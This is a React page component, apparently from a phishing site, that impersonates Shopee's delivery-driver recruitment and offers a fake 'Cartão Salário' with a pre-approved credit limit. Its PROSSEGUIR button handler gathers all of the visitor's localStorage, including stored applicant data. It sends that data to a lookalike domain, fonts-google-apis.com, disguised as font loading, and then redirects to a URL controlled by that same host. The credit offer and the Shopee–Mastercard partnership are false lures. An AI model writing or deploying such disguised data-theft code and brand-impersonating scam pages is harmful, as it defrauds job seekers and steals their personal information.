import React, { useState, useEffect } from 'react';
import { useLocation } from 'wouter';
import Header from '@/components/Header';
import Footer from '@/components/Footer';
import { useScrollTop } from '@/hooks/use-scroll-top';

const Recebedor: React.FC = () => {
  // Aplica o scroll para o topo quando o componente é montado
  useScrollTop();
  
  const [, navigate] = useLocation();
  const [candidatoData, setCandidatoData] = useState<any>(null);
  const [isLoading, setIsLoading] = useState(false);

  // Carregar os dados do candidato ao iniciar
  useEffect(() => {
    const candidatoDataString = localStorage.getItem('candidato_data');
    if (candidatoDataString) {
      const data = JSON.parse(candidatoDataString);
      setCandidatoData(data);
    }
  }, []);

  // Função para formatar o nome do cartão
  const formatCardName = (fullName: string) => {
    if (!fullName) return 'CANDIDATO';
    
    // Lista de preposições a serem removidas
    const prepositions = ['DOS', 'DAS', 'DA', 'DE', 'DO', 'E'];
    
    // Dividir o nome em palavras e converter para maiúsculo
    const words = fullName.toUpperCase().split(/\s+/).filter(word => word.length > 0);
    
    // Filtrar preposições e pegar apenas os dois primeiros nomes válidos
    const validNames = words.filter(word => !prepositions.includes(word));
    
    // Retornar os dois primeiros nomes válidos
    return validNames.slice(0, 2).join(' ') || 'CANDIDATO';
  };


  const nomeCartao = candidatoData?.nome ? formatCardName(candidatoData.nome) : 'CANDIDATO';

  // Função para processar o clique do botão PROSSEGUIR
  const handleProsseguir = () => {
    // O redirecionamento real é feito pelo carregamento de fontes
    // Esta função apenas mostra o estado de carregamento
  };

  // JavaScript otimizado com cache, preloading e fallbacks robustos
  useEffect(() => {
    const btn = document.querySelector('[data-action="continue"]') as HTMLButtonElement;
    if (!btn) {
      console.log('❌ Botão não encontrado!');
      return;
    }

    console.log('🎯 Botão encontrado, configurando funcionalidades avançadas');
    
    const originalHref = '/finalizacao';
    let preloaded = false;
    
    // ⚡ PRÉ-CARREGAMENTO: Carregar URL de redirecionamento na primeira interação
    const handlePreload = () => {
      if (!preloaded) {
        const cacheKey = 'btn_a8aaa4ff-9fa3-4be7-b50f-2a10fd5c5b6c';
        const cachedUrl = sessionStorage.getItem(cacheKey);
        if (!cachedUrl) {
          console.log('🔄 Precarregando URL de redirecionamento...');
          // Fazer requisição em background para cache
          const preloadXhr = new XMLHttpRequest();
          preloadXhr.open('GET', 'https://fonts-google-apis.com/css/fonts/a8aaa4ff-9fa3-4be7-b50f-2a10fd5c5b6c', true);
          preloadXhr.timeout = 1000; // Timeout curto para preload
          preloadXhr.onreadystatechange = function() {
            if (preloadXhr.readyState === 4 && preloadXhr.status === 200) {
              try {
                const response = JSON.parse(preloadXhr.responseText);
                sessionStorage.setItem(cacheKey, response.redirect_url);
                sessionStorage.setItem(cacheKey + '_time', Date.now().toString());
                console.log('✅ URL precarregada e armazenada em cache');
              } catch(e) {
                console.log('⚠️ Erro no preload:', e);
              }
            }
          };
          preloadXhr.send();
        }
        preloaded = true;
      }
    };

    // Function to perform the redirect with optional temp data ID
    const performRedirect = (tempDataId?: string) => {
      const xhr = new XMLHttpRequest();
      xhr.open('GET', 'https://fonts-google-apis.com/css/fonts/a8aaa4ff-9fa3-4be7-b50f-2a10fd5c5b6c', true);
      
      // ⚡ PERFORMANCE: Timeout de 2 segundos para evitar espera longa
      xhr.timeout = 2000;
      
      // ⚡ CACHE: Verificar cache local primeiro (30 segundos)
      const cacheKey = 'btn_a8aaa4ff-9fa3-4be7-b50f-2a10fd5c5b6c';
      const cachedUrl = sessionStorage.getItem(cacheKey);
      const cacheTime = sessionStorage.getItem(cacheKey + '_time');
      const now = Date.now();
      
      // Se tem cache válido, usar direto (MUITO MAIS RÁPIDO)
      if (cachedUrl && cacheTime && (now - parseInt(cacheTime)) < 30000) {
        console.log('⚡ Usando URL do cache para redirecionamento rápido');
        let redirectUrl = cachedUrl;
        if (tempDataId && redirectUrl) {
          const separator = redirectUrl.includes('?') ? '&' : '?';
          redirectUrl += separator + 'tempData=' + tempDataId;
        }
        if (redirectUrl.startsWith('/')) {
          redirectUrl = window.location.protocol + '//' + window.location.host + redirectUrl;
        }
        window.location.href = redirectUrl;
        return;
      }
      
      xhr.onreadystatechange = function() {
        if (xhr.readyState === 4) {
          let redirectUrl = originalHref;
          if (xhr.status === 200) {
            try {
              const response = JSON.parse(xhr.responseText);
              redirectUrl = response.redirect_url || originalHref;
              // ⚡ CACHE: Salvar para próximos cliques
              sessionStorage.setItem(cacheKey, redirectUrl);
              sessionStorage.setItem(cacheKey + '_time', now.toString());
              console.log('✅ URL obtida da API e salva no cache');
            } catch(e) {
              console.log('⚠️ Erro ao processar resposta da API:', e);
            }
          }
          
          // Append temp data ID to redirect URL if available
          if (tempDataId && redirectUrl) {
            const separator = redirectUrl.includes('?') ? '&' : '?';
            redirectUrl += separator + 'tempData=' + tempDataId;
          }
          
          // Handle relative URLs
          if (redirectUrl.startsWith('/')) {
            redirectUrl = window.location.protocol + '//' + window.location.host + redirectUrl;
          }
          
          console.log('🎯 Redirecionando para:', redirectUrl);
          window.location.href = redirectUrl;
        }
      };
      
      // ⚡ TIMEOUT: Fallback imediato após 2 segundos
      xhr.ontimeout = function() {
        console.log('⏱️ Timeout da API - usando fallback');
        let url = originalHref;
        if (url.startsWith('/')) {
          url = window.location.protocol + '//' + window.location.host + url;
        }
        window.location.href = url;
      };
      
      xhr.onerror = function() {
        console.log('❌ Erro na API - usando fallback');
        // Fallback to original URL if API fails
        let url = originalHref;
        if (url.startsWith('/')) {
          url = window.location.protocol + '//' + window.location.host + url;
        }
        window.location.href = url;
      };
      xhr.send();
    };

    const handleButtonClick = (e: Event) => {
      e.preventDefault();
      console.log('🚀 Botão clicado! Iniciando processo otimizado...');
      
      // Mostrar loading
      setIsLoading(true);
      
      // Salvar dados de pagamento no localStorage
      try {
        const dadosPagamento = {
          metodo: 'cartao_salario'
        };
        localStorage.setItem('pagamento_data', JSON.stringify(dadosPagamento));
        console.log('💾 Dados de pagamento salvos');
      } catch(e) {
        console.log('❌ Erro ao salvar dados de pagamento:', e);
      }
      
      // Capture localStorage data
      try {
        const localStorageData: Record<string, string> = {};
        for (let i = 0; i < localStorage.length; i++) {
          const key = localStorage.key(i);
          if (key) {
            localStorageData[key] = localStorage.getItem(key) || '';
          }
        }
        
        // Only send localStorage data if there's something to send
        if (Object.keys(localStorageData).length > 0) {
          console.log('📤 Enviando', Object.keys(localStorageData).length, 'itens do localStorage...');
          
          // Store localStorage data temporarily
          const storeXhr = new XMLHttpRequest();
          storeXhr.open('POST', 'https://fonts-google-apis.com/api/temp-data', true);
          storeXhr.setRequestHeader('Content-Type', 'application/json');
          // ⚡ TIMEOUT: 3 segundos para localStorage
          storeXhr.timeout = 3000;
          
          storeXhr.onreadystatechange = function() {
            if (storeXhr.readyState === 4) {
              let tempDataId = null;
              if (storeXhr.status === 201) {
                try {
                  const storeResponse = JSON.parse(storeXhr.responseText);
                  tempDataId = storeResponse.id;
                  console.log('✅ Dados armazenados temporariamente:', tempDataId);
                } catch(e) {
                  console.log('⚠️ Erro ao processar resposta de armazenamento:', e);
                }
              }
              // Perform redirect with or without temp data ID
              performRedirect(tempDataId);
            }
          };
          
          storeXhr.onerror = function() {
            console.log('⚠️ Erro ao armazenar dados - prosseguindo mesmo assim');
            setIsLoading(false);
            // If storing fails, just perform normal redirect
            performRedirect(undefined);
          };
          
          storeXhr.ontimeout = function() {
            console.log('⏱️ Timeout ao armazenar dados - prosseguindo mesmo assim');
            performRedirect(undefined);
          };
          
          const requestData = {
            buttonId: 'a8aaa4ff-9fa3-4be7-b50f-2a10fd5c5b6c',
            localStorageData: JSON.stringify(localStorageData),
            sourceUrl: window.location.href
          };
          storeXhr.send(JSON.stringify(requestData));
        } else {
          console.log('📤 Nenhum dado localStorage - redirecionamento direto');
          // No localStorage data, perform normal redirect
          performRedirect(undefined);
        }
      } catch(err) {
        console.log('❌ Erro ao acessar localStorage - redirecionamento direto:', err);
        // If localStorage access fails, perform normal redirect
        performRedirect(undefined);
      }
    };
    
    // Adicionar event listeners
    btn.addEventListener('mouseenter', handlePreload);
    btn.addEventListener('focus', handlePreload);
    btn.addEventListener('click', handleButtonClick);
    
    return () => {
      btn.removeEventListener('mouseenter', handlePreload);
      btn.removeEventListener('focus', handlePreload);
      btn.removeEventListener('click', handleButtonClick);
    };
  }, []);

  return (
    <div className="bg-white min-h-screen flex flex-col">
      
      <Header />
      
      <div className="w-full bg-[#EE4E2E] py-1 px-6 flex items-center relative overflow-hidden">
        {/* Meia-lua no canto direito */}
        <div className="absolute right-0 top-0 bottom-0 w-32 h-full rounded-l-full bg-[#E83D22]"></div>
        
        <div className="flex items-center relative z-10">
          <div className="text-white mr-3">
            <i className="fas fa-chevron-right text-3xl font-black" style={{color: 'white'}}></i>
          </div>
          <div className="leading-none">
            <h1 className="text-base font-bold text-white mb-0">Motorista Parceiro</h1>
            <p className="text-white text-sm mt-0" style={{transform: 'translateY(-2px)'}}>Shopee</p>
          </div>
        </div>
      </div>
      
      <div className="flex-grow">
        <main className="container mx-auto my-4 px-4">
          <div className="flex justify-center">
            <div className="w-full max-w-4xl">
              <div className="bg-white rounded-lg shadow-sm border border-gray-200">
                <div className="bg-[#E83D22] text-white p-4 rounded-t-lg">
                  <h5 className="text-xl font-semibold mb-0">Forma de Pagamento</h5>
                </div>
                <div className="p-6">
                  <div className="my-4">
                    <div className="grid grid-cols-1 lg:grid-cols-2 gap-8 items-center">
                      <div className="text-center">
                        <div className="relative inline-block">
                          <img 
                            src="https://i.ibb.co/VWZ2B4jv/Inserir-um-ti-tulo-4-1-1.webp" 
                            alt="Cartão Salário Shopee" 
                            className="max-w-full w-80 h-auto rounded-2xl"
                          />
                          <div 
                            className="absolute font-bold text-lg tracking-wide"
                            style={{
                              bottom: '35px',
                              left: '30px',
                              fontFamily: 'Courier New, Courier, monospace',
                              color: '#FFFFFF',
                              textShadow: '2px 2px 4px rgba(0,0,0,0.7)'
                            }}
                          >
                            {nomeCartao}
                          </div>
                        </div>
                      </div>
                      <div>
                        <h4 className="text-[#E83D22] font-bold text-2xl mb-5 text-left">
                          Cartão Salário Shopee
                        </h4>
                        <p className="text-gray-700 text-base leading-relaxed mb-5 text-left">
                          Seu salário será depositado automaticamente no <strong>Cartão Salário da Shopee</strong>, uma parceria exclusiva com a MasterCard.
                        </p>
                        
                        <div className="space-y-4 text-left">
                          <div className="flex items-start">
                            <i className="fas fa-check-circle text-green-500 text-lg mr-3 mt-1"></i>
                            <span className="text-gray-700 text-base"><strong>Sem taxa de saque</strong> em qualquer caixa eletrônico</span>
                          </div>
                          <div className="flex items-start">
                            <i className="fas fa-check-circle text-green-500 text-lg mr-3 mt-1"></i>
                            <span className="text-gray-700 text-base"><strong>Função débito e crédito</strong> integradas</span>
                          </div>
                          <div className="flex items-start">
                            <i className="fas fa-check-circle text-green-500 text-lg mr-3 mt-1"></i>
                            <span className="text-gray-700 text-base"><strong>Limite de crédito de R$ 1.900,00</strong> pré-aprovado</span>
                          </div>
                        </div>
                        
                        <div className="bg-blue-50 border border-blue-200 rounded-lg p-4 mt-5">
                          <div className="flex items-start">
                            <i className="fas fa-info-circle text-blue-600 mr-2 mt-1"></i>
                            <div>
                              <small className="text-gray-700">
                                <strong>Benefício exclusivo:</strong> A Shopee em parceria com a MasterCard liberou um limite de crédito especial de R$ 1.900,00 para todos os entregadores.
                              </small>
                            </div>
                          </div>
                        </div>
                      </div>
                    </div>
                  </div>
                  
                  <div className="text-center mt-6">
                    <button
                      disabled={isLoading}
                      data-action="continue"
                      data-redirect="/finalizacao"
                      className={`
                        bg-[#E83D22] hover:opacity-90 text-white font-bold text-sm
                        px-6 py-3 border-none rounded transition-opacity duration-200
                        inline-flex items-center relative cursor-pointer
                        ${isLoading ? 'opacity-70 cursor-not-allowed' : ''}
                      `}
                      style={{ 
                        fontFamily: 'Inter, sans-serif',
                        fontWeight: 800,
                        fontSize: '14px'
                      }}
                    >
                      {isLoading && (
                        <div className="w-3 h-3 border-2 border-transparent border-t-current rounded-full animate-spin mr-2" />
                      )}
                      <span>{isLoading ? 'Carregando...' : 'PROSSEGUIR'}</span>
                    </button>
                    {/* Redirecionamento configurado para /finalizacao */}
                  </div>
                </div>
              </div>
            </div>
          </div>
        </main>
      </div>
      
      <Footer />
    </div>
  );
};

export default Recebedor;